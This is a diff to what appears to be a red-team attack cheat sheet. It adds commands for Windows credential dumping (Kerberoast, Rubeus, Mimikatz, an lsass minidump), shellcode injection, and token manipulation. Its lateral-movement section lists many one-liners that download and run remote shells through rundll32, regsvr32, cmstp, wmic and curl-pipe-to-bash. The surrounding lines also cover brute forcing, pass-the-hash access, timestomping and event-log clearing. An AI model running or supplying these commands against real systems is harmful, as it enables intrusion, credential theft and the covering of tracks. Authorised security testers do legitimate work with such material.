@@ -6,7 +6,7 @@
 # initial access firewall cve (out of scope?)
 python3 pfsense_auth_2.2.6_exec.py localhost:65535 nc <IP>
 
-# initial access firewall (lockout feature) web-proxy, ftp, dns, and web-conf 
+# initial access firewall (lockout feature!) web-proxy, ftp, dns, and web-conf 
 proxychains hydra -L ~/users.txt -P ~/passwords.txt <IP> ssh -u -V;
 
 # shell to dmz boxes via ssh 
@@ -146,13 +146,25 @@ GetProcessFull
 invoke_file /tmp/InjectShellcode.ps1
 msfvenom -a x64 --platform windows -p windows/x64/exec cmd="powershell \"iex(new-object net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1')\"" -f  powershell;
 Inject-Shellcode -Shellcode $buff ParentID <TARGETPID> -QueueUserAPC
+invoke_file /tmp/Invoke-TokenManipulation.ps1
+invoke-tokenmanipulation -createprocess "cmd.exe" -username "<DOMAIN>/<USER>" processargs "/c powershell -exec bypass -noninteractive -e <BASE64>"";
 
 # downgrade for DES hash, crack DES for NTLM
 invoke_file /tmp/Get-Hash.ps1
 Get-Hash
+invoke-binary /tmp/InternalMonologue.exe
 
-# lsass mini-dump for NTLM or plaintext
+# credential access, hashes
+invoke_file /tmp/Invoke-Kerberoast.ps1
+invoke-kerberoast -domain target.local -outputformat hashcat|select hash
+invoke-binary rubeus.exe triage
+invoke-binary rubeus.exe dump
 dll-loader -http -path http://<URL>/sharpsploit.dll; [sharpsploit.credentials.mimikatz]::logonpasswords();
+invoke_file /tmp/Invoke-Mimikatz.ps1
+Invoke-Mimikatz
+invoke_binary Invoke-Mimikittenz.exe
+
+# minidumps
 invoke_file /tmp/Out-Minidump.ps1
 Get-Process lsass| Out-Minidump -DumpFilePath C:\temp
 TimeStomp c:\temp\lsass_<PID>.dmp  "01/03/2012 12:12 pm"
@@ -171,6 +183,22 @@ foreach($log in (get-eventlog -list|foreach-object {$_.log})){clear-eventlog -lo
 
 ###### LATERAL MOVEMENT
 ```txt
+# payload delivery (http, smb, webdav)
+DotNetToJScript.exe -l JScript -v v4 -c TestClass p:\Shell.exe
+wmic.exe process get brief /format:"https://<URL>/shell.xsl"
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://<URL>/shell.js")
+cmstp.exe /ni /s https://<URL>/shell.inf
+regsvr32 /s /u /i:https://<URL>/shell.sct scrobj.dll
+rundll32 \\<IP>\<SHARE>\Powershdll.dll,main [system.text.encoding]::default.getstring([system.convert]::frombase64string("base64"))^|iex
+rundll32 p:\PowerShdll.dll,main . { iwr -useb https://<URL>/shell.ps1 }^|iex;
+InstallUtil.exe /logfile= /LogToConsole=false /U PowerShdll.dll
+regsvcs.exe PowerShdll.dll
+regasm.exe /U PowerShdll.dll
+netsh.exe add helper p:\PowerShdll.dll
+wget -q -O - http://<IP>/shell.py|python -
+curl -s http://<IP>/shell.py|sudo python -
+curl -sv --insecure https://<IP>/shell.sh|bash -
+
 # ongoing access
 proxychains wmiexec.py -nooutput -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP> "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))";
 proxychains evil-winrm -i <IP> -u <USER> -H <NTLMHASH> -s ./modules -e ./modules -P 5985;Bypass-4MSI
